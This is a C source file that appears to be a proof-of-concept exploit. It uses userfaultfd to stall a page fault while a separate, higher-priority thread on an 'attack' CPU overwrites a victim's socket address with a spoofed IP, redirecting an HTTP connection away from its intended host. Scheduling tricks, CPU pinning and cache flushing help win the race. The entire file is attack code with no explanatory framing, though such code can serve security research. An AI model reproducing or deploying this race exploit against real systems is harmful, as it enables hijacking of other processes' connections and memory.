#include "include.h"
#include "config.h"

static volatile void write_ip_addr(struct sockaddr_in* serv_addr) {
    struct hostent* server  = gethostbyname(SPOOF_IP);
    bcopy((char*)server->h_addr, (char*)&serv_addr->sin_addr.s_addr, server->h_length);
}

static void* fault_handler_thread(void* arg) {
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;
    static char* page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;
        
    set_affinity(VICTIM_CPU);

    if (page == NULL) {
        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
        handle_error_en(page, "mmap");
    }

  for (;;) {
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        handle_error_en(nready, "poll");
   
    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
        printf("EOF on userfaultfd!\n");
        exit(EXIT_FAILURE);
    }

    if (nread == -1)
        handle_error_en(nread, "read");

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
        fprintf(stderr, "Unexpected event on userfaultfd\n");
        exit(EXIT_FAILURE);
    }

    uffdio_copy.src = (unsigned long) page;
    uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;

    flush(page);
    sender(); 

    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        handle_error_en(-1, "ioctl-UFFDIO_COPY");

        printf("        (uffdio_copy.copy returned %lld)\n", uffdio_copy.copy);
    }
}

FORCE_INLINE int nanosleep_helper(long nsec) {
    struct timespec req, rem;
    req.tv_sec = 0;
    req.tv_nsec = nsec;

    ssize_t ret;
    
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        /*                      RDI      RSI     */
        : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
        : "rcx", "r11", "memory"
    );
    return ret;
}


static void* thread_start(void* arg) {
    set_affinity(ATTACK_CPU);

    receiver();
    write_ip_addr(page);
    flush(page);
    
    int s = mprotect((void* )page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (s != 0) {
        handle_error_en(s, "mprotect");
    }
    return NULL;
}

void do_connect(struct sockaddr_in* serv_addr) {
    int sockfd, portno, n;
    struct hostent* server;

    char buffer[4096];
    char response[4096];
    portno = 80;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }

    server = gethostbyname(REAL_IP);

    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }

    bzero((char*) serv_addr, sizeof(*serv_addr));
    serv_addr->sin_family = AF_INET;
    bcopy((char*)server->h_addr, (char*)&serv_addr->sin_addr.s_addr, server->h_length);
    serv_addr->sin_port = htons(portno);

    printf("%d\n", serv_addr->sin_addr.s_addr);
    if (connect(sockfd, (struct sockaddr*)serv_addr, sizeof(*serv_addr)) < 0) {
        perror("****************** ERROR connecting: attack fail *********************");
        exit(1);
    }

    sprintf(buffer, "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", REAL_IP);
    n = write(sockfd, buffer, strlen(buffer));
    if (n < 0) {
        perror("ERROR writing to socket");
        exit(1);
    }

    bzero(response, 4096);
    while ((n = read(sockfd, response, 4095)) > 0) {
        printf("%s", response);
        bzero(response, 4096);
    }
    if (n < 0) {
        perror("ERROR reading from socket");
        exit(1);
    }
}

int main(int argc, char** argv) {
    int s;
    pthread_attr_t attr;
    pthread_t thread;
    struct sched_param param;
    int policy;

    set_affinity(VICTIM_CPU);
    
    page_size = sysconf(_SC_PAGE_SIZE);
    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        handle_error_en(page, "mmap failure");

    s = userfaultfd_setup(page, 1);
    if (s < 0)
        handle_error_en(s, "userfaultfd_setup error");
    
    s = pthread_attr_init(&attr);
    if (s != 0)
        handle_error_en(s, "pthread_attr_init");

    int priority = PRIORITY_MAIN;
    param.sched_priority = priority;
    policy = SCHED_IDLE;
    s = pthread_setschedparam(pthread_self(), SCHED_IDLE, &param);

    int inheritsched = PTHREAD_EXPLICIT_SCHED;
    pthread_attr_setinheritsched(&attr, inheritsched);
    if (s != 0)
        handle_error_en(s, "pthread_attr_setinheritsched");

    priority = PRIORITY_OVERWRITE;
    policy = SCHED_RR;
    set_child_scheduling(&attr, policy, priority); 
    
    s = pthread_create(&thread, NULL, &thread_start, NULL);
    if (s != 0)
        handle_error_en(s, "pthread_create");

    nanosleep_helper(NANOSLEEP_TIME);

    do_connect((struct sockaddr_in*)page);
    exit(EXIT_SUCCESS);
}
